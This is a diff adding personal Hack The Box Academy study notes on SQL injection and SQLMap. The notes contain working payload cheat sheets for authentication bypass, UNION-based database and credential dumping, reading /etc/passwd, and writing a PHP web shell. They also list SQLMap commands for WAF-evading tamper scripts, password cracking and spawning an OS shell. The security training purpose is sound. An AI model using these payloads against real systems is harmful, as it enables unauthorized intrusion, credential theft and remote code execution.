@@ -3907,3 +3907,211 @@ NTLMv2: `svc_qualys:security#1`
 ### Complete
 
 [Completion Link](https://academy.hackthebox.com/achievement/713396/57)
+
+## SQL Injection Fundamentals
+
+### Databases
+
+- **Relational databases** use structured schemas with tables, rows, and columns, and are ideal for storing well-defined data that can be easily queried using SQL. Data in these tables is interconnected through keys, allowing efficient data management. Examples include MySQL and PostgreSQL.
+- **Non-relational databases** (NoSQL) don't rely on fixed schemas or structured tables, instead using flexible storage models like key-value pairs, documents, wide-columns, or graphs. They are best suited for unstructured or dynamic datasets and are highly scalable. A common example is MongoDB.
+
+To be able to write files to the back-end server using a MySQL database, we require three things:
+
+1. User with FILE privilege enabled
+2. MySQL global _secure_file_priv_ variable not enabled (`SHOW VARIABLES LIKE 'secure_file_priv';` or `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`)
+3. Write access to the location we want to write to on the back-end server
+
+### Cheatsheet
+
+**MySQL**
+
+**General**
+
+| Command                                            | Description              |
+| -------------------------------------------------- | ------------------------ |
+| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | Login to MySQL database  |
+| `SHOW DATABASES`                                   | List available databases |
+| `USE users`                                        | Switch to database       |
+
+**Tables**
+
+| Command                                                           | Description                               |
+| ----------------------------------------------------------------- | ----------------------------------------- |
+| `CREATE TABLE logins (id INT, ...)`                               | Add a new table                           |
+| `SHOW TABLES`                                                     | List available tables in current database |
+| `DESCRIBE logins`                                                 | Show table properties and columns         |
+| `INSERT INTO table_name VALUES (value_1, ..)`                     | Add values to table                       |
+| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table |
+| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`  | Update table values                       |
+
+**Columns**
+
+| Command                                                   | Description                      |
+| --------------------------------------------------------- | -------------------------------- |
+| `SELECT * FROM table_name`                                | Show all columns in a table      |
+| `SELECT column1, column2 FROM table_name`                 | Show specific columns in a table |
+| `DROP TABLE logins`                                       | Delete a table                   |
+| `ALTER TABLE logins ADD newColumn INT`                    | Add new column                   |
+| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Rename column                    |
+| `ALTER TABLE logins MODIFY oldColumn DATE`                | Change column datatype           |
+| `ALTER TABLE logins DROP oldColumn`                       | Delete column                    |
+
+**Output**
+
+| Command                                               | Description                                              |
+| ----------------------------------------------------- | -------------------------------------------------------- |
+| `SELECT * FROM logins ORDER BY column_1`              | Sort by column                                           |
+| `SELECT * FROM logins ORDER BY column_1 DESC`         | Sort by column in descending order                       |
+| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | Sort by two columns                                      |
+| `SELECT * FROM logins LIMIT 2`                        | Only show first two results                              |
+| `SELECT * FROM logins LIMIT 1, 2`                     | Only show two results starting from index 2              |
+| `SELECT * FROM table_name WHERE <condition>`          | List results that meet a condition                       |
+| `SELECT * FROM logins WHERE username LIKE 'admin%'`   | List results where the name is similar to a given string |
+
+**MySQL Operator Precedence**
+
+- Division (`/`), Multiplication (`*`), and Modulus (`%`)
+- Addition (`+`) and Subtraction (`-`)
+- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
+- NOT (`!`)
+- AND (`&&`)
+- OR (`||`)
+
+**SQL Injection**
+
+**Auth Bypass**
+
+| Payload            | Description                     |
+| ------------------ | ------------------------------- |
+| `admin' or '1'='1` | Basic Auth Bypass               |
+| `admin')-- -`      | Basic Auth Bypass with comments |
+
+**Union Injection**
+
+| Payload                                             | Description                                    |
+| --------------------------------------------------- | ---------------------------------------------- |
+| `' order by 1-- -`                                  | Detect number of columns using ORDER BY        |
+| `cn' UNION select 1,2,3-- -`                        | Detect number of columns using UNION injection |
+| `cn' UNION select 1,@@version,3,4-- -`              | Basic UNION injection                          |
+| `UNION select username, 2, 3, 4 from passwords-- -` | UNION injection for 4 columns                  |
+
+**DB Enumeration**
+
+| Payload                                                                                                                     | Description                                |
+| --------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
+| `SELECT @@version`                                                                                                          | Fingerprint MySQL with query output        |
+| `SELECT SLEEP(5)`                                                                                                           | Fingerprint MySQL with no output           |
+| `cn' UNION select 1,database(),2,3-- -`                                                                                     | Current database name                      |
+| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                   | List all databases                         |
+| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                  | List all tables in a specific database     |
+| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table       |
+| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                        | Dump data from a table in another database |
+
+**Privileges**
+
+| Payload                                                                                                                                    | Description                                          |
+| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
+| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                                    |
+| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges                    |
+| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find all user privileges                             |
+| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
+
+**File Injection**
+
+| Payload                                                                                                   | Description                                   |
+| --------------------------------------------------------------------------------------------------------- | --------------------------------------------- |
+| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                  | Read local file                               |
+| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                              | Write a string to a local file                |
+| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
+
+### Complete
+
+[Link of Completion](https://academy.hackthebox.com/achievement/713396/33)
+
+## SQLMap Essentials
+
+### Overview
+
+The technique characters BEUSTQ refers to the following:
+
+- B: Boolean-based blind (`AND 1=1`)
+- E: Error-based (`AND GTID_SUBSET(@@version,0)`)
+- U: Union query-based (`UNION ALL SELECT 1,@@version,3`)
+- S: Stacked queries (`; DROP TABLE users`)
+- T: Time-based blind (`AND 1=IF(2>1,SLEEP(5),0)`)
+- Q: Inline queries (`SELECT (SELECT @@version) from`)
+
+**Level/Risk**
+By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.
+
+For such demands, the options `--level` and `--risk` should be used:
+
+- The option `--level` (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
+- The option `--risk` (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
+
+### Tamper Scripts
+
+Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.
+
+For example, one of the most popular tamper scripts [between](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) is replacing all occurrences of greater than operator (`>`) with `NOT BETWEEN 0 AND #`, and the equals operator (`=`) with `BETWEEN # AND #`. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.
+
+Tamper scripts can be chained, one after another, within the `--tamper` option (e.g. `--tamper=between,randomcase`), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. [ifnull2ifisnull](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/ifnull2ifisnull.py)). In contrast, some tamper scripts do not care about the inner content (e.g. [appendnullbyte](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/appendnullbyte.py)).
+
+Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:
+
+| Tamper-Script               | Description                                                                                                                  |
+| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | --- | --- |
+| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                     |
+| `base64encode`              | Base64-encodes all characters in a given payload                                                                             |
+| `between`                   | Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #                     |
+| `commalesslimit`            | Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart                                                 |
+| `equaltolike`               | Replaces all occurrences of operator equal (=) with LIKE counterpart                                                         |
+| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                           |
+| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                       |
+| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                  |
+| `percentage`                | Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                          |
+| `plus2concat`               | Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart                                                        |
+| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                               |
+| `space2comment`             | Replaces space character ( ) with comments `/`                                                                               |
+| `space2dash`                | Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)                        |
+| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n) |
+| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters     |
+| `space2plus`                | Replaces space character ( ) with plus (+)                                                                                   |
+| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                          |
+| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (&& and                                               |     | )   |
+| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                            |
+| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                         |
+
+### Cheatsheet
+
+| Command                                                                                                                   | Description                                                 |
+| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
+| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
+| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
+| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run SQLMap without asking for user input                    |
+| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | SQLMap with POST request                                    |
+| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
+| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to SQLMap                      |
+| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`                                                        | Specifying a cookie header                                  |
+| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
+| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
+| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
+| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
+| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
+| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
+| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
+| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
+| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
+| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
+| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
+| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
+| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
+| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
+| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
+| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
+| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
+| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |
+
+### Complete
+
+[Link of Completion](https://academy.hackthebox.com/achievement/713396/58)
